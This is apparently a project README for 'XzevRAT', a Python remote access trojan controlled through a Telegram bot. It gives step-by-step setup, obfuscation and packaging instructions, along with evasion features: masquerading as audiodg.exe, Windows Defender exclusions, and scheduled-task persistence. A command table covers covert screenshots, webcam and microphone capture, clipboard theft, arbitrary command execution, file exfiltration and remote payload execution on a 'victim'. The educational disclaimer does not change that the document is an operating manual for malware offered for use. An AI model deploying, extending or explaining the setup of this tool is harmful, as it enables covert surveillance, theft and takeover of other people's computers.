# 🧿 XzevRAT — Remote Administration Tool via Telegram

**XzevRAT** is a powerful remote administration tool written in Python, using Telegram as its command and control channel. It gives you full control over the target machine (victim) from any device with Telegram installed. This project is intended for **educational purposes and ethical penetration testing**.

---

## 📌 Key Features

- **Full control** over remote machines.
- **Stealth**: the process disguises itself as the system process `audiodg.exe` and adds itself to Windows Defender exclusions.
- **Persistence**: automatically registers in Windows Task Scheduler (task named `WinUpdateSvc`) and survives reboots.
- **Anonymity**: all traffic goes through Telegram Bot API – no open ports required.
- **Cross‑platform**: the controlling side (bot) runs on Windows, Linux, and macOS; the agent (victim) runs on Windows 7, 8, 10, and 11.

---

## ⚙️ Installation & Setup

### 1. Create a Telegram bot
- Message [@BotFather](https://t.me/BotFather) and create a new bot. Get your **token**.
- Create a private channel (or group) where the bot will send reports.
- Add the bot as an administrator with permission to send messages.
- Obtain the **channel ID** using bots like `@userinfobot`.

### 2. Prepare encrypted credentials
The project includes `encrypt.py`. Open it and insert your values:

```python
bot_token = "YOUR_TOKEN"
chat_id = "YOUR_CHANNEL_ID"
```

Run the script:

```bash
python encrypt.py
```

It will output two encrypted strings (base64). Copy them.

### 3. Insert encrypted data into `main.py`
In `main.py`, find these lines:

```python
encrypted_token = "ВАШ_ТОКЕН_БОТА_ДЛЯ_ТЕЛЕГРАМА_ПРОЙДЕННЫЙ_ЧЕРЕЗ_ШИФРОВКУ_С_ПОМОЩЬЮ_ВТОРОГО_ПАЙТОН_ФАЙЛА"
encrypted_chat = " ВАШ_АЙДИ_ЧАТА_ТЕЛЕГРАМ_ПРОЙДЕННЫЙ_ЧЕРЕЗ_ШИФРОВКУ_С_ПОМОЩЬЮ_ВТОРОГО_ПАЙТОН_ФАЙЛА"
```

Replace them with the strings you obtained. Keep the encryption key (`Z!g47aLuEbANN`) unchanged (or change it if you wish, but then you must also update the `xor_decrypt` function accordingly).

### 4. Compile into executable (optional)
To create a single `.exe` file with obfuscation, use the `obfuscate_fixed.bat` batch file. It automatically:
- Applies PyArmor for code obfuscation.
- Bundles everything into one executable using PyInstaller.
- Compresses the result with UPX.

**Prerequisites:** Install `pyarmor`, `pyinstaller`, and UPX (if not installed, run `pip install pyarmor pyinstaller` and download UPX from the official site, place `upx.exe` in the project folder or in PATH).

Run `obfuscate_fixed.bat` as administrator. The final file `WindowsAudioService.exe` will appear in the `dist` folder.

### 5. Run on target machine
- Run `main.py` (or the `.exe`) as administrator. On first execution, the program will copy itself to `%ProgramData%\WindowsUpdateSvc`, add exclusions to Defender, and create a scheduled task. After that, you can close the console – the RAT will continue to run in the background.

---

## 🎮 Control via Telegram

All commands are sent to your bot’s chat or to the channel (if configured). Each command starts with `/` and usually requires the target hostname (the computer name that the RAT obtains on startup).

### Command list

| Command | Description |
|---------|-------------|
| `/list` | Shows all online devices |
| `/screen username` | Takes a screenshot of the victim’s desktop |
| `/webcam username` | Captures a photo from the webcam (if available) |
| `/micro username` | Records 10 seconds of audio from the microphone |
| `/buffer username` | Displays the current clipboard content |
| `/presskey username combination` | Simulates key presses (e.g., `alt+f4`, `ctrl+shift+t`) |
| `/cmd username command` | Executes any CMD command |
| `/browser username URL` | Opens a link in the default browser |
| `/wallpaper username` (with attached image) | Changes desktop wallpaper |
| `/play username` (with attached audio) | Plays audio on the victim’s PC |
| `/upload username` (with attached file) | Uploads a file to the victim’s PC |
| `/execute username filename` | Runs a previously uploaded file |
| `/files username` | Lists contents of Desktop, Documents, and Downloads folders |
| `/export username file_path` | Downloads a file from the victim |
| `/off username` | Shuts down the computer (no confirmation) |
| `/restart username` | Restarts the computer |
| `/killme username` | Self‑destructs the RAT (deletes all files, tasks, and terminates) |

**Note:** replace `username` with the actual computer name of the victim (shown in `/list`).

---

## 🛡️ Security & Masking

- **Process:** renames itself to `audiodg.exe` and copies itself to a system folder.
- **Task Scheduler:** creates a task named `WinUpdateSvc` that runs at user login.
- **Obfuscation:** source code is encrypted and compressed to hinder antivirus detection.
- **Traffic:** all commands and responses are sent via Telegram Bot API (HTTPS) – no open ports needed.

---

## 📁 Project Structure

- `main.py` – main agent script.
- `encrypt.py` – helper script to encrypt token and chat ID.
- `obfuscate_fixed.bat` – batch file for compilation and obfuscation.
- `guide.txt` / `гайд.txt` – usage instructions (English/Russian).
- `README.txt` / `ПрочитайМеня.txt` – short setup notes.

---

## ⚠️ Disclaimer

This project is intended **solely for educational purposes, ethical penetration testing, and learning about remote administration techniques.** The author takes **no responsibility** for any misuse of this software. Using it on computers without explicit consent is illegal. You are solely responsible for your actions.

---

## 📞 Contacts

- **Telegram Channel:** [@Leviathan_official](https://t.me/Leviathan_official) (official channel)
- **Developer contact:** [@Xzevrat](https://t.me/Xzevrat)

---

**Enjoy! Remember: with great power comes great responsibility.**



## 💰 Support the Project

If you find XzevRAT useful for your educational or penetration testing activities, you can support further development by donating ETH. Every contribution helps keep the project alive and motivates me to add new features.

**Ethereum (ETH) address:**  
`0x83948c53254Eab9Cb2161DaFC7d9DDfa8cF46021`

**Scan the QR code** — it contains the ETH address.  
Open your wallet → send ETH → paste the address (or scan again directly from wallet).

![QR-код для доната ETH](images/QRcode.gif)

Your support is entirely **optional**, but highly appreciated! Thank you for being part of this journey.
